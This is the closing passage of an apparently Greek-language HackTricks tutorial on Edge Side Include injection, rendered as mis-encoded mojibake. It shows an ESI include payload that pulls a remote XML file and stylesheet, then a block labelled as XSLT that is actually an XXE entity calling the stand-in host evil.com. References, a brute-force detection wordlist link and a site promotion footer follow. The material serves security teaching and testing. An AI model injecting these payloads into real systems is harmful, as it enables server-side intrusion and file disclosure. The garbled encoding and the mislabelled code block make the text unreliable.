Ï„Î¿Ï€Î¹ÎºÏÎ½ Î±ÏÏ‡ÎµÎ¯Ï‰Î½.
```xml
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
XSLT Î±ÏÏ‡ÎµÎ¯Î¿:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
Check the XSLT page:

{% content-ref url="xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

### Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
* [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
* [https://academy.hackthebox.com/module/145/section/1304](https://academy.hackthebox.com/module/145/section/1304)
* [https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91)

## Î›Î¯ÏƒÏ„Î± Î‘Î½Î¯Ï‡Î½ÎµÏ…ÏƒÎ·Ï‚ Brute-Force

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
